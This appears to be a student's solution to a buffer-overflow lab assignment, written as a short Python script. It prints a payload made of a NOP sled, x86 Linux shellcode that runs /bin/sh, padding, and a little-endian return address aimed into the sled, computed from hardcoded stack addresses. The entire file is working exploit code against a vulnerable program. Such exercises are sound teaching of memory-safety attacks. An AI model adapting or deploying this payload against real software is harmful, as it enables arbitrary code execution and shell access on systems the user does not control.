import struct 
import sys

your_buffer =  ""

eip_addr = 0xffffcf5c
buf_addr = 0xffffcd63
offset = eip_addr - buf_addr
# YOUR CODE: Generate buf appropriately

# Chose a huge string of 157 bytes for getting &buf
# Choosing a NOP sled size of 128 and return address at 60th byte
nop_sled = b"\x90" * 128

# Choosing a random point in the NOP sled to spawn shellcode
return_addr = buf_addr + 60 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

overflow_len = offset - len(nop_sled) - len(shellcode)
overflow = b"*" * overflow_len

# Little endian conversion
your_buffer = nop_sled + shellcode + overflow + struct.pack("<I", return_addr)
sys.stdout.buffer.write(your_buffer)